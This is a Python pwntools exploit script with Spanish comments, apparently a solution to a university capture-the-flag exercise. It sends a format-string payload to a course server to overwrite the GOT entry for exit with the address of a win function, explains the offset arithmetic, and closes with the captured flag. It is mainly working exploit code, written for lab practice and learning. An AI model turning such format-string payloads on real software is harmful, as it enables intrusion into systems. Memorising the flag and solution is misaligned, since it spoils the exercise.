#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host ic.catedras.linti.unlp.edu.ar --port 15020
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'ic.catedras.linti.unlp.edu.ar'
port = int(args.PORT or 15020)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# Avanza hasta que pida el input
io.recvuntil(b">")

# Vuln no retorna a main sino que llama a exit y termina, por lo que debo cambiar la direccion de exit por la de win en la GOT
# La dirección de exit es 080498f0
exit_address = b'0x080498f0'
target_address = int(exit_address, 16)

# La direccion de win es 080484e4
# El string se guarda en el parametro 4$
# Entonces, tengo que escribir la direccion de win (080484e4) en la direccion de exit (080498f0)
# La explicacion de como escribir una dirección esta en https://axcheron.github.io/exploit-101-format-strings/
# Tengo que dividirla en dos y mandar esa cantidad de bytes a la parte alta y a la parte baja de la dirección.
# Parte alta: 0804 = 2052 - 8 = 2044 Es menos 8 porque ya escribimos dos direcciones de 4 bytes cada una
# Parte baja: 84e4 = 34020 - 2052 = 31968. 

payload = p32(target_address + 2)+p32(target_address)+b"%2044x%4$hn%31968x%5$hn\n"   

io.send(payload)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

# Flag: IC{6I5N0KgiZXAtdBp}

